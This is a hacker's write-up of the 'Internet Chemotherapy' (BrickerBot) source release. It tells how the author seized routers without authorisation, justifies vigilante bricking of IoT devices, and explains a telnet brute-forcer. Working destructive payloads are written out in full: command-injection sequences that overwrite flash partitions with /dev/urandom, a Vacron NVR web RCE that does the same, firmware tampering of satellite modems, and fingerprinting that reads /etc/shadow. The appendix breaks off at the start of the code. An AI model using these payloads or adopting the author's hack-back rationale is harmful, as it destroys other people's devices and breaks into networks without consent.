7/31 2020


   ___       _                       _   
  |_ _|_ __ | |_ ___ _ __ _ __   ___| |_ 
   | || '_ \| __/ _ \ '__| '_ \ / _ \ __|
   | || | | | ||  __/ |  | | | |  __/ |_ 
  |___|_| |_|\__\___|_|  |_| |_|\___|\__|
                                        
    ____ _                          _   _                                
   / ___| |__   ___ _ __ ___   ___ | |_| |__   ___ _ __ __ _ _ __  _   _ 
  | |   | '_ \ / _ \ '_ ` _ \ / _ \| __| '_ \ / _ \ '__/ _` | '_ \| | | |
  | |___| | | |  __/ | | | | | (_) | |_| | | |  __/ | | (_| | |_) | |_| |
   \____|_| |_|\___|_| |_| |_|\___/ \__|_| |_|\___|_|  \__,_| .__/ \__, |
                                                            |_|    |___/ 

                                                                  PART 11

                                               Reference Source Code Drop

 by Dr Cyborkian a.k.a. janit0r - conditioner of 'terminally ill' devices



Previous postings can be found at least here:

Original (Project Introduction): 
(Was at https://0x00sec.org/t/internet-chemotherapy/4664, regrettably no 
 longer available - thanks for hosting it as long as you could)

Part 2 (ISPs: Lessons from the Rogers Hi-Speed Internet incident): 
http://depastedihrn3jtw.onion.pet/show.php?md5=ee7136ac48fa59fba803b9fbcbc6d7b9 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=ee7136ac48fa59fba803b9fbcbc6d7b9 (Tor)

Part 3 (ISPs: The baffling case of Optify/Keycom's mismanagement):
http://depastedihrn3jtw.onion.pet/show.php?md5=7e7bfe406315f120d8ed325ffb87670b (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=7e7bfe406315f120d8ed325ffb87670b (Tor)

Part 4 (ISPs: The dirty case of Telkom South Africa)
http://depastedihrn3jtw.onion.pet/show.php?md5=11830bc79a079f5b7be33bcca84641f6 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=11830bc79a079f5b7be33bcca84641f6 (Tor)

Part 5 (The IoT Battlefield: Device Stability)
http://depastedihrn3jtw.onion.pet/show.php?md5=8ca2bcadeb75137725557a24848d3c17 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=8ca2bcadeb75137725557a24848d3c17 (Tor)

Part 6 (The IoT Battlefield: Mitigation Methods)
http://depastedihrn3jtw.onion.pet/show.php?md5=2c822a990ff22d56f3b9eb89ed722c3f (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=2c822a990ff22d56f3b9eb89ed722c3f (Tor)

Part 7 (The IoT Battlefield: Default Passwords)
http://depastedihrn3jtw.onion.pet/show.php?md5=a4232ae8f56034348323ab4483187abb (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=a4232ae8f56034348323ab4483187abb (Tor)

Part 8 (The IoT Battlefield: The Where and Why)
http://depastedihrn3jtw.onion.pet/show.php?md5=2a7d5afa2731381a6ead8dbda3005e5d (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=2a7d5afa2731381a6ead8dbda3005e5d (Tor)

Part 9 (Bricking Basics and DIY)
http://depastedihrn3jtw.onion.pet/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Tor)

NEW IN 2020:

Part 10 (The XiongMai Backdoor Saga Continues)
http://depastedihrn3jtw.onion.pet/show.php?md5=7a4eca95154215c8847c4e664a48ad37 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=7a4eca95154215c8847c4e664a48ad37 (Tor)



--[ Table of contents

  1 - Introduction
  2 - Backstory and origins: How I got started
    2.1 - Backstory and origins: My first IoT contact
    2.2 - Backstory and origins: From fighting IoT spam to tracking IoT worms
    2.3 - Backstory and origins: Taking on IoT botnets
  3 - Source code
    3.1 - Source: General comments 
    3.2 - Source: The default configuration
    3.3 - Source: High level structure
    3.4 - Source: Telnet login configuration
    3.5 - Source: Telnet payloads 
    3.6 - Source: Web payloads
    3.7 - Source: Additional notes
  4 - Appendix: Simple frontline sensor source for OpenWrt mini-python 2.5


--[ 1 - Introduction

As the IoT botnet situation looks significantly better in 2020 than it did 
back in 2016-2017 I am comfortable releasing additional reference source code. 

This is a simple python sensor with some offensive and hack-back capabilities.
It is intended to be executed on the highly stripped down OpenWrt Kamikaze 
Python Mini 2.5 package which is missing a lot of the more convenient python 
libraries and lacks multi-threading support. I was also learning python at the 
time I wrote this which sadly shows. Having this frontline sensor script 
running on thousands of routers was nonetheless a useful tool when I was 
cleaning up the IoT mess back in 2016-2018, and many of the payloads are 
still relevant in 2020.
 
I do recommend that you check a few of my postings if you intend to read the
code. In particular Part 9 of my writeup will give you insights on design and
workflows. DeepPaste is temperamental (offline half the time) but you can 
hopefully still obtain my 2018 posting here:

http://depastedihrn3jtw.onion.pet/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Clearnet)
http://depastedihrn3jtw.onion/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Tor)

Keep in mind that this was simply designed as a first-responder type sensor  
and for more ambitious large-scale cleanups I recommend taking a multi-layered 
approach. It is a good idea to have fallback systems in place to double-
check the work of your frontline systems and verify that there are no longer  
operational devices on the IP:ports that were supposedly cleaned up (and if 
necessary engage in additional corrective measures/debugging). Otherwise you
will lose sight of the effectiveness of your payloads.

This system has been referred to as 'BrickerBot' (trademark owned by Radware
Ltd) which in practice was a multi-layered architecture with different 
subsystems performing different tasks such as hash cracking. I had separate 
subsystems in place for dealing with SSH and SSL workloads (not included here).
 
Good luck to future Internet janitors.
 
'There is no limit to the good you can do if you don't care who gets the 
 credit. '                                         -General George Marshall


--[ 2 - Backstory and origins: How I got started 

If you look at the code the first thing you might wonder about is how come I 
ended up packing a precompiled minimalistic python interpreter capable of only
running single threaded scripts on routers. This is admittedly an unusual 
design from a botnet-building perspective.

The reason is simple - I was an average 'weekend warrior' type whitehat with 
limited time and access to computers, and I was not in the game of building 
botnets. If anything, I was trying to prevent them from being built. For this 
source code to make more sense I'll tell you a bit about my origins. The 
backstory is a typical 'road to hell paved with good intentions' type tale 
which adds context to the design decisions and maybe even explains how I 
ended up in this mess to begin with. It could have happened to anybody :P


--[ 2.1 - Backstory and origins: My first IoT contact

Back in 2015 or so I was a member of a semi-technical forum which was being 
targeted by an obnoxious spammer. The forum admins shared a list of IPs that 
had been used by the miscreant, and upon closer examination I realized that 
the IPs were generally MikroTik or Ubiquiti routers with easily guessable 
default logins (admin/<blank> or ubnt/ubnt). This was my first introduction 
to the IoT scene and I was dismayed over the poor state of security on these 
devices.

Had I been smart I would have just said 'install a better spam filter' and
left it at that. But being an opportunistic whitehat I decided to stop the 
spammer the hard way and so I began studying devices from both manufacturers 
and wrote some basic scripts and automated systems for non-destructively 
securing the vulnerable devices and warning their owners. My systems would 
for example change the secured router's hostname to something like 
HACKED-ROUTER-HELP-SOS, HACKED or similar in the naively optimistic belief 
that the owners would pay attention and notice that they had lost access. I 
tried to predict ways in which the spammer was finding his vulnerable 
devices and get to these devices first. Soon enough I was able to rake in 
and secure dozens and even hundreds of vulnerable routers per day, and the 
spammer was having a harder and harder time to get through.

For me this was my first lesson on the power of time and patience. I did not 
require much infrastructure to be successful. Being in the game of securing 
devices I only ever needed to successful once per vulnerable device. I could 
afford to wait and play things safely. For some people the idea of being able 
to secure only 40 devices in a day might seem pointless and disappointing, but 
over 10 days this amounted to 400 routers, and in a month the count reached 
well over 1000. And pretty soon things started to pick up.

These continued minor victories added up and the accrued interest in the form 
of more visibility, additional data and new knowledge helped me refine my 
setup. This would later be an all-important perspective when slowly grinding 
away at Mirai and similar IoT botnets with 'telnet killers' and other 
defensive measures -- I knew that even a 1% success rate per day would be 
enough to win the war even when it paradoxically looked like I was 'losing' 
every battle along the way. 

Eventually I gained enough visibility to track down the forum spammer as well,
and it turned out to be some 'SEO specialist' from the East Coast. This would
have made for a good story in itself but suffice to say that the spamming 
stopped and the 'specialist' went into a different line of work.

At this point in time I faced my first genuine dilemma. I had achieved the 
goal I wanted to achieve (stop the spammer) and now I had to decide what to do
with my router securing operation. By now I had refined the setup and was 
automatically raking in and securing more routers than ever. I had expanded the 
setup to handle other router models as well such as Fortinet FortiGates and 
Ciscos. Maybe I should keep my systems going a little while longer? At the time 
I reasoned that the exposed routers could still pose a threat to other online 
communities and e-mail providers and so I decided to continue my router cleanup 
effort 'just a little longer' until the daily numbers decreased and reached 
safe levels.

At this point in time I still saw myself as a whitehat trying to help the
community at large. Securing incompetently configured routers was in 
everyone's best interests. I did the incompetent owners a favor by helping 
them use the Internet without router malware problems and the Internet at 
large was safer for it.

Most of the routers I secured I never accessed again after confirming that 
they were secure. On a subset of routers I ran simple listening sensors to 
gain visibility of what was happening on the Internet. This simple SigInt 
allowed me to map out the high level device topogaphy of the IPv4 space and 
to keep my operation quiet and efficient. My objective was to gain listening
coverage on as many networks around the world as possible and to deploy such
sensors with discretion.


--[ 2.2 - Backstory and origins: From fighting IoT spam to tracking IoT worms

Then, in May 2015, the Ubiquiti MF worm happened. This was a pretty crude worm 
for Ubiquiti routers which preyed on a vulnerability I hadn't heard of before 
(EDB-39701). As I already had an effective Ubiquiti router securing system in 
place I was able to react immediately. More importantly, as things blew up so
quickly I was also reacting without thinking much about the consequences. I 
adapted my sensors to specialize in hunting for MF infections and almost 
immediately I started raking in and securing thousands and thousands of 
routers per day. 

At the time it felt surreal that nobody - besides a few Ubiquiti users in the 
official forums - seemed to even notice what I was up to. This was another 
important lesson for me - I observed first-hand the 'fog of war' of the IoT 
battlefield. As I was taking over a subset of routers which were 1) by 
definition not well monitored or managed, 2) consisted of genuinely vulnerable 
firmware, and 3) signaled the vulnerability to the rest of the Internet using 
trackable signatures I was able to take them over quickly and quietly. It 
wasn't necessary to perform inefficient and noisy mass scans of the entire 
world and light up random honeypots in the process. It was enough for me just 
to keep listening as I now had a presence on all major ISP networks. It was 
possible to shut down a harmful worm and to secure hundreds of thousands of 
routers without a single news article or Tweet being written about it - and 
that's is how I preferred it.

(As a side note I'll say that people eventually DID notice the aftermath of 
this event - 1.5 years later - when the Shodan search engine started mapping 
the Ubiquiti discover protocol and some HACKED-ROUTER-HELP-SOS and HACKED 
banners turned up on poorly filtered networks. But for now let's stick with 
the MF worm of May 2015)
 
On one hand I felt elated since I believed I was doing something good and I 
appeared to be saving the Internet from real harm. But on the other hand I was 
agonizing over being stuck cleaning a much bigger mess than I had bargained 
for. The worst part was that I was already in control of over a hundred 
thousand routers which belonged to ISPs and it wasn't clear what I should do 
with them. I could just try to hand them back, but if the original netadmins 
could be trusted with managing such infrastructure then they would not have 
lost control of their routers in the first place. The MF worm was exploiting 
an old vulnerability which had been patched in 2014 and so the APs could have 
already been compromised for months before the worm hit. Could the ISPs be 
trusted to warn their customers about the breach? A few trial cases 
disappointingly indicated that they could not - the 'Internet professionals' 
had been caught red-handed jeopardizing the safety of their end-users and 
now they preferred to cover up the fiasco.
 
This was a watershed moment. Until now I had viewed myself as a clear-cut 
whitehat, someone who was trying to help the community and people no matter 
who they were. Now, the picture was no longer so simple. Clearly there were 
some reckless actors among the ISP operators who were trying to cover up 
their security negligence. These people cared more about making a quick buck 
than they cared about the safety of their customers or the Internet in 
general. By this point I didn't feel like doing the rest of them any favors 
and thought that it was in the best interest of their end-users for me to 
leave the 'HACKED' and 'HACKED-ROUTER-HELP-SOS' banners in place for as long 
as possible. In an attempt to warn more people about the poor ISP security 
standards I also started to look for ways to pivot my access further. By 
now I had learned enough about networks and hacking that I knew how to look 
for things of interest floating around. 

I decided to spend the next year infiltrating ISP networks and non-
destructively taking over their gear. This was an interesting time and I 
could probably write a book about the things I saw and learned. Yet 
technically my operation wasn't very complex. I had a simple C&C mechanism
which allowed me to communicate with devices that were under my control, and 
I used it to run ad hoc scripts tailored for different networks. I used
precompiled binaries from the OpenWrt packages for getting useful tools such 
as nmap and python on these systems and I automated everything best I could. 
I had now become a network vigilante, but in this new 'Chaotic Good' mindset 
I also started seeing new ways of dealing with problems which had lacked any 
conventional solutions.


--[ 2.3 - Backstory and origins: Taking on IoT botnets

Around the holiday seasons of 2014 and 2015 I had read about a phenomenon
called 'Holiday DDoS' which was fueled to a large degree by insecure IoT 
devices such as DVRs, IP cameras, and cheaper routers. With many teenagers 
home from school for the holidays some spent their spare time creating
botnets from these easily hacked devices and using them for Distributed 
Denial of Service attacks against the most popular online gaming services 
and other web sites. 

Until now I had generally ignored these devices since I didn't like dealing 
with unencrypted protocols and in practice the devices seemed unfixable 
anyway. However, in Q3 and Q4 of 2016 some increasingly alarming mainstream 
news coverage of a new IoT botnet called Mirai started emerging. I'm sure
anyone reading this is familiar with the Mirai backstory so I won't repeat
it here, but with the holiday season of 2016 approaching the unfixable IoT 
devices had became a problem that could no longer be ignored.

The idea of deliberately disabling all the insecure devices which had been 
fueling the unprecedented DDoS attacks felt wrong on many levels, but by 
the time the Dyn attack occured in October 2016 it seemed like it was the 
only realistic option left.

Some of the factors in my reasoning were:

* The noble Linux.Wifatch (Reincarna) effort appeared ineffective and my 
  attempts to contact The White Team via their public e-mail address never
  got a reply. My preferred option would have been to donate my routers 
  to this effort and help it become effective on a wider range of devices 
  but as far as I could tell it looked like the effort had been abandoned.

* Legislative solutions were realistically years away, and it's not clear
  what some amendments to state or even national laws could do to fix 
  vulnerable devices in places like Vietnam or Iran. The Internet was in 
  immediate peril without any effective conventional solutions in sight.

* On the ethical side I spent a lot of time thinking about the vulnerable
  device owners. They were innocent victims of device manufacturer and 
  reseller negligence just as the end-users of ISPs had been during the MF 
  worm outbreak. Yet they would also be the ones bearing the financial 
  burden whenever an out-of-warranty device got bricked. Ultimately I
  reasoned that these unlucky people would still be better off in the long 
  run by being forced to replace their insecure devices now. Malware attacks 
  can easily be more expensive than the cost of a DVR and the trivially 
  hackable IoT devices were ideal springboards for such network intrusions. 

* I also thought about potential real life precedents such as the Good 
  Samaritan laws and in particular medical ethics. It is no coincidence that 
  I named my new project 'Internet Chemotherapy' and used the silly monicker 
  'Dr Cyborkian' (a reference to a Dr Jack Kevorkian of 90s fame) since the 
  medical profession has had a long history of being forced to balance non-
  maleficence against beneficence, and even law. Only this time around the 
  Internet was the patient and the patient was unwell. 

Having made the decision I still had to consider how to implement the solution
technically. Based on my previous experiences with cleaning router worms it 
seemed most straightforward to use a similar architecture and approach. I 
already had my C&C mechanisms and tooling in place to harness routers as  
script execution hosts and so it made sense to do some prototyping on my 
existing platform. I had an initial prototype hack-back telnet bruteforcer 
with a few bricking payloads up and running around mid-November 2016, and as 
it appeared to work well enough I put it into immediate production use. 
Originally I did not intend to keep running this script for very long. The 
objective was simply to cull down the exploitable/unfixable IoT device counts 
enough to prevent a record-setting 'Holiday DDoS' season by the end of 2016. 
By the time I realized that my 'Internet Chemotherapy' project would take much 
longer to complete (and the IoT mess was much worse than I had thought) I was 
pretty much stuck with this python framework that I had hacked together as a 
'quick fix'. There was simply too much to do to consider rearchitecting or
rewriting the frontline sensor.

Working with python scripts however made rapid iterations possible and this 
became useful straight away when the TR-069 NewNTPServer vulnerability was 
discovered around the end of November 2016. I was able to bring a prototype 
'route del default' payload online almost immediately after the issue emerged. 
I've written in detail about my TR-069 related experiences in Part 8 so I 
won't go into detail about these here, but the flexibility and my existing 
infrastructure made the 'big python script' approach workable in spite of 
the drawbacks.

In this source code drop you are getting the end-result of over 370 such 
payload iterations over time. It is still a simple frontline sensor package 
for non-encrypted communication channels but I have added some new payloads 
relevant for 2020. Clearly much could still be done to improve it and the code 
could benefit from some heavy-handed refactoring but the script can hopefully 
still serve as a useful standalone reference for any future network janitors. 
Note that I have removed the control channel hooks from the source (since 
these would not be useful to you without my C&C backend).


--[ 3 - Source code

Some brief notes are provided to assist in the reading of the source code.


--[ 3.1 - Source: General comments 

This frontend script has gone through a lot of iterations and could benefit 
from refactoring. 

One notably odd bit of code duplication in the script stems from the fact 
that I originally ran a separate control process (handling remote control 
and child processes) and a separate hot-swappable sensor process. This 
wasted RAM by requiring 2+ python interpreters to run at the same time so 
I did an ugly minimal effort merge of the two scripts. Obviously the 
resulting duplication should have been refactored and cleaned up but then 
again the entire codebase would benefit from a rewrite.

Some other oddities in the program design stem from the fact that this script 
is designed to be executed under the heavily stripped down python-mini_2.5.4-2
OpenWrt package from the Kamikaze release which in practice means limited
library support and single threading only.


--[ 3.2 - Source: The default configuration

Although the script is remotely configurable the default setup is in use until 
overriden by a C&C. Some potentially useful default variables are:

* The CONTROLsentinellistenports array - this specifies which ports we will 
  be listening on for incoming connections. Example:

  CONTROLsentinellistenports = [ 23, 2323, 5358, 8080, 37215, 60001 ]

* The CONTROLsentinelscanports array - this specifies which ports we will try
  to connect to on systems which have connected to us. Example:

  CONTROLsentinelscanports = [ 22, 23, 26, 80, 81, 82, 83, 84, 8000, 2222, 
    2323, 8080, 8081, 8082, 23231, 23123, 6789, 7547, 5555, 19058, 8023, 
    8022, 5358, 5000, 5001, 8888, 9000, 4719, 88, 9999, 12323, 8181, 8443, 
    60023, 1080, 3000, 3749, 8001, 8060, 8090, 8880, 10000, 9527, 37215, 
    52869, 9001, 10023, 2601 ]

  The default operation of these scanports is to listen for any kind of
  CLI interface prompt, and if nothing happens in 15 seconds then a HTTP
  GET request is made.

* The CONTROLsentinelscanwebports array - this additionally specifies some
  ports to which we will connect and immediately perform a HTTP GET request
  in order to profile likely web ports. Example:

  CONTROLsentinelscanwebports = [ 80, 81, 82, 83, 84, 5555, 8080, 8081, 8082, 
    7547, 8443, 9000, 10000, 37215, 52869, 60001, 4567 ]

There are other default configuration options as well, but the general mode of
operation is that the C&C will set the appropriate states as soon as the 
sensor comes online.


--[ 3.3 - Source: High level structure

The single threaded nature of the frontend forces us to update the different
payload and scan jobs in update loops. Each protocol has its own set of 
functions for creating new jobs and for updating all existing jobs.

The primary creation functions are:

* def brutemaster_create( targetip, targetport, bannerhint ):

  Creates a telnet brute force job against a particular IP and port. Takes
  the scan banner string as an input (against which we will generate an array
  of login guesses that will be used). The related bruteforce_create function
  creates the individual telnet task for each login that we are testing.

* def xmpintask_create( targetip, targetport ):

  Creates a Xiongmai pinning job. This and the related xmpinclient_create
  functions basically just create a task that sends a large number of UI crash
  commands in the hopes that the owner will notice and fix the unit. This is a
  plan B in case our bricking attempts fail (or cannot be completed due to 
  temp firewalls etc). 

* def webtask_create( targetip, targetport, bannerhint, loginhint = '', 
  passwordhint = '' ):

  This creates a web (HTTP) job against a particular IP and port. Takes the
  HTTP scan banner string as an input (against which we will generate a payload
  to send). The related webclient_create function handles the actual payload
  sending logic.

* def tr69task_create( targetip, targetport ):

  This creates a TR069 job against a particular IP and port. Takes the IP and
  port as input. The related tr69client_create function handles the actual 
  payload sending logic.

For these protocol specific handlers there is typically a corresponding 
_update() function which handles the actual business logic. 


--[ 3.4 - Source: Telnet login configuration

A telnet daemon is expected to provide a login prompt and optionally some kind
of banner on connect. This banner string can be used for identification 
purposes.

For every brutemaster_create job, the banner string passed to the function will 
be searched against the bruteforce_dictionary_specific array for a match. The
array schema is simple:

bruteforce_dictionary_specific = [
  [ '<banner regular expression match 1>',
    '<login1/passC>',
    '<login2/passD>',
  ],
  [ '<banner regular expression match 2>',
    '<login3/passC>',
    '<login4/passD>',
  ],
  # etc
]

If a particular banner string matches one or more regular expressions in the 
array, the associated logins will be added to the front of the login queue. 

The daemon-specific login list will then be filled with entries from the
bruteforce_dictionary_generic and/or bruteforce_dictionary_extra arrays until
bruteforce_maxattempts number of logins have been added to the list.

Note that the banner strings which are matched have been sanitized with the
following substitution filters:

  data = re.sub( '\r?\n', ';', data )
  data = re.sub( '[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', data )

In other words linefeeds are converted to ; characters and only a subset of 
plain characters are passed on to the banner matching. This sanitized output
also made for cleaner processing at the C&C end.


--[ 3.5 - Source: Telnet payloads 

On a successful login to a telnet interface the script will attempt to 
determine which payload to send to it. 

Two forms of payload matching are used -- we can match a payload to a login
and/or to some replies observed in the telnet session so far.

Similarly to the password matching mechanism in section 3.4 the session
buffer is also filtered by a substitution pattern before matching occurs.

The payload matches reside in the bruteforce_router_mitigations array. It
has the following schema:

bruteforce_router_mitigations = [
  [ '<payloadid1>',                        # id for payload
    '<loginregexp1>', '<sessionregexp1>',  # matching regexps
    '<command1>', '<waitfor1>',            # command and wait-for-match pairs 
    '<command2>', '<waitfor2>', 
    '<command3>', '<waitfor3>', 
  ],
  [ '<payloadid2>',
    '<loginregexp2>', '<sessionregexp2>',
    '<command1>', '<waitfor1>',
    '<command2>', '<waitfor2>', 
    '<command3>', '<waitfor3>', 
  ],
  # etc
]

If we cannot match a payload against the login then we will attempt to finger-
print the telnet device using a simple sequence of commands defined in the
bruteforce_fingerprinting_commands string. As of now the command sequence is:

  w
  uname -a
  ls -alF /etc/
  cat /etc/passwd
  cat /etc/shadow
  cat /proc/version

As an example payload entry, see the following:

	# Another Broadcom router but using custom payload for it due to telnet killers
	[ 'dsl500b', '.*', 'DSL-500B',
	  'ping ;sh', '',
	  'cat /dev/urandom >/dev/mtdblock0 &', '',
	  'cat /dev/urandom >/dev/mtdblock1 &', '',
	  'cat /dev/urandom >/dev/mtdblock2 &', '',
	  'cat /dev/urandom >/dev/mtdblock3 &', '',
	  'cat /dev/urandom >/dev/mtdblock4 &', '',
	  'cat /dev/urandom >/dev/mtdblock5 &', '',
	  'cat /dev/urandom >/dev/mtdblock6 &', '',
	  'cat /dev/urandom >/dev/mtdblock7 &', '',
	  'cat /dev/urandom >/dev/root &', '',
	  'iptables -A OUTPUT -j DROP', '%WAIT%',
	],

Here the payload ID name is 'dsl500b' (this is arbitrary, only used for 
accounting purposes in the C&C backend) and the payload will match any
login ('.*') along with session string 'DSL-500B'. That is, if the session
log so far has contained the string 'DSL-500B' we will pick this payload
for pushing into the telnet session.

The payload itself is relatively straightforward. We trigger a simple RCE
in the ping command handler without waiting for a reply, and then proceed
with dumping some well-known bricking commands.

Note that the last line of the sequence contains a '%WAIT%' tag, which 
causes the payload processor to wait for 30 seconds before continuing the
sequence.

The most common supported sequence tags supported are:

%OLDUSER% - the username that was used to log into the device with
%OLDPASS% - the password that was used to log into the device with
%NEWPASS% - a pseudo-random 8 character string which remains the same for the
            duration of the session.
%TARGETIP% - the IP of the device we logged into
%TARGETPORT% - the TCP port of the telnet daemon we logged into
%WAIT% - wait for 30 seconds until the next command is executed

The utility of the tags can be seen in the following example payload:

	# eltex OpenWrt with adminpassword root auth
	[ "eltex", ".*", 'M5J9DWFfcVbL.*AuwJc4KI.*bin/ash',
		"telnet localhost", 'login: ',
		"root", 'Password: ',
		'adminpassword', 'root\S+# ',
		'passwd %OLDUSER%', 'New password:',
		'%NEWPASS%', 'Retype password:',
		'%NEWPASS%', 'root\S+# ',
		'passwd', 'New password:',
		'%NEWPASS%', 'Retype password:',
		'%NEWPASS%', 'root\S+# ',
		'save', 'root\S+# ',
		'reboot', 'root\S+# ',
	],    

In the event our fingerprinting sequence's 'cat /etc/shadow' reveals a
particular hash present on eltex OpenWrt devices we should be able to non-
destructively fix the insecure accounts without damaging the device. Here we
start the payload by telnetting to localhost (allows us to escalate our
privileges to root by using the known password) and then we change the passwd
of the original login account to something new. For every line of the payload
we stop and wait on an expected prompt before we proceed with the sequence.
After settings have been updated we will reboot the device to get rid of
potential malware.

By the end of it the device should hopefully have a secure password for the 
low privilege account and the root account, and this new auth will then be 
sent back to the C&C for reference.

Here's another example payload:

  # Some satellite Internet modem kind of a thing? Falcon Netmodem.. South America
  [ 'falcon', '.*', '(Unknown Command: \'|RMT:\d+.*@telnet:)',
    'offline', '[>#] ',
    'offline', '[>#] ',
    'passwd', 'password',
    '%OLDPASS%', 'password',
    '%NEWPASS%', 'password',
    '%NEWPASS%', '[>#] ',
    'reset board', '[>#] ',
    'DSC sleep 99999999', '[>#] ',
    'ip sat0 add 1.2.3.4 255.255.255.0 1.2.3.5 sat0', '[>#] ',
    'params GLOBAL set max_mssg_bufs 1', '[>#] ',
    'params GLOBAL set initial_mssg_bufs 1', '[>#] ',
    'params SECURITY set falcon_console_from_localhost_only 1', '[>#] ',
    'params LL set ll_tx_window 1', '[>#] ',
    'params LL set ll_rx_window 1', '[>#] ',
    'params SPOOF set spoof_oos_buffer_size 1', '[>#] ',
    'params PAD set pad_tdma_payload 1', '[>#] ',
    'reset application', '%WAIT%',
    'ENTER_ERROR_STATE', '[>#] ',
    'TERMINATE', '[>#] ',
  ],

Due to the buggy interface we are waiting on prompt after each command
with the regular expression '[>#] ' (matches either a > character followed
by a space or a # character followed by a space) before we send the next
command. The password update sequence requires us to wait for an appropriate 
prompt.


--[ 3.6 - Source: Web payloads

The web payloads are matched against the reply to a straightforward
'GET / HTTP/1.0' request. Before matching occurs the buffer is also 
filtered by a substitution pattern before matching occurs as follows:

  data = re.sub( '\r?\n', ';', data )
  data = re.sub( '[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', data )

The payloads and regex matches reside in the webtaskdatabase array.
The schema of this array is:

  webtaskdatabase = [
    [ '<payloadid1>', 			# arbitrary identifier for bookkeeping
      '<regex match 1>',    # regular expression match 
      '<payload sequence request 1>', 
      '<payload sequence request 2>', 
      '<payload sequence request 3>',
    ], 
    [ '<payloadid2>',
      '<regex match 2>', 
      '<payload sequence request 1>', 
      '<payload sequence request 2>', 
      '<payload sequence request 3>',
      # etc
    ], 
    # etc
  ]

For an actual example, let's look at the simple Vacron NVR payload:

	# VACRON NVR
	[ 'vacron', '(VACRON NVR|Boa.*title>DVR LOGIN<\/ti)', 
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock0 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock9 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock10 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/sda1 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock1 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock2 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock3 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock4 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock5 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock6 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock7 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock8 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/root HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=route%20del%20default HTTP/1.0\r\n\r\n',
		'GET / HTTP/1.0\r\n\r\n',
	],

The payload ID 'vacron' is an arbitrary string that we simply pass down to the
C&C for bookkeeping and statistics. After that follows a regular expression 
for finding a potentially vulnerable device, which is:

  '(VACRON NVR|Boa.*title>DVR LOGIN<\/ti)'

Then the well-known RCE against these units is executed and we attempt to wipe
one MTD devie or drive at a time until the device times out. We prioritize the
most common partitions first.

Finally, the payload runs another 'GET / HTTP/1.0' against the device to 
confirm that the payload actually was successful. If the payload succeeded then
the device should no longer be online by this point.

The actual business logic of how payload sequence request replies are processed 
resides in the massively bloated webclient_close function (which would benefit 
from a complete refactoring). For the Vacron payload we carry out a minimal
amount of work for the payload handler:

  if actionscript == 'vacron':
    webtask_login[jobhash] = 'n'
    webtask_password[jobhash] = 'a'
    webtask_payloadindex[jobhash] += 1

As the exploit is pre-auth we just leave the login/password as n/a for 
bookkeeping and increment the payload index by one. This action script is
executed once for each sequence request in the payload.

The most common tags for web payloads are:

%%TARGETIP%% - the IP of the device we are connecting to
%%TARGETPORT%% - the TCP port of the http daemon we are connecting to
%%LOGIN%% - payload specific, whatever actionscript set as webtask_login 
%%PASSWORD%% - payload specific, whatever actionscript sets as webtask_password
%%CUSTOM1%% - payload specific, arbitrary strings set by actionscript
%%CUSTOM2%% - payload specific, arbitrary strings set by actionscript
%%CUSTOM3%% - payload specific, arbitrary strings set by actionscript
%%CUSTOM4%% - payload specific, arbitrary strings set by actionscript
%%BODYLENGTH%% - length of body of request, useful for Custom-Length

Much of the contents of the tags are payload specific and it is generally a
good idea to look at the corresponding actionscript entry in webclient_close
when reading through the web payload sequences.


--[ 3.7 - Source: Additional notes

A additional notes about the source:

* For older Ubiquiti routers the following MIPS package should work well:

  http://downloads.openwrt.org/kamikaze/8.09.2/ar71xx/packages/python-mini_2.5.4-2_mips.ipk

* I have removed the C&C hooks from the code since these are useless without 
  my backend.

* Yes, the code is nasty but the most useful part is in the payload strings
  and passwords. These should port pretty easily to some other framework. 

* I don't recommend trying to add SSL support to this script directly as the
  extra overhead of OpenWrt OpenSSL is too much for most of the older routers.
  I've used newer routers and binaries from a more recent OpenWrt release for 
  running such jobs.


--[ 4 - Appendix: Simple frontline sensor source for OpenWrt mini-python 2.5

#
# 'Internet Chemotherapy' build 373
# A frontline sensor bot by janit0r
#
# As the IoT botnet situation looks significantly better in 2020 than it did 
# back in 2016-2017 I am comfortable releasing additional reference source code. 
# 
# This is a simple python sensor with some offensive and hack-back capabilities.
# It is intended to be executed on the highly stripped down OpenWrt Kamikaze 
# Python Mini 2.5 package which is missing a lot of the more convenient python 
# libraries and lacks multi-threading support. I was also learning python at the 
# time I wrote this which sadly shows. Having this frontline sensor script 
# running on thousands of routers was nonetheless a useful tool when I was 
